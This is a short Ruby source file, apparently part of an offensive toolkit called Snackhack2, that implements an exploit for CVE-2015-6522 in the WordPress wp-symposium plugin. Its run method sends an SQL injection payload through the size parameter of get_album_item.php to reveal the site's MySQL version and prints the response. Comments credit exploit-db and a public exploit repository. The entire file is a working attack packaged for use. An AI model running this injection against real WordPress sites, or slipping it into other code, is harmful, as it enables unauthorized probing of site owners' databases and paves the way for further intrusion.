# frozen_string_literal: true

module Snackhack2
  class WPSymposium
    # SOURCE: https://github.com/prok3z/Wordpress-Exploits/tree/main/CVE-2015-6522
    # https://www.exploit-db.com/exploits/37824
    # Reveal the MySQL version
    def initialize(site)
      @site = site
    end

    def run
      wp = Snackhack2::get(File.join(@site,
                                  '/wp-content/plugins/wp-symposium/get_album_item.php?size=version%28%29%20;%20--'))
      if wp.code == 200
        puts wp.body
      else
        puts "[+] HTTP Code: #{wp.code}"
      end
    end
  end
end
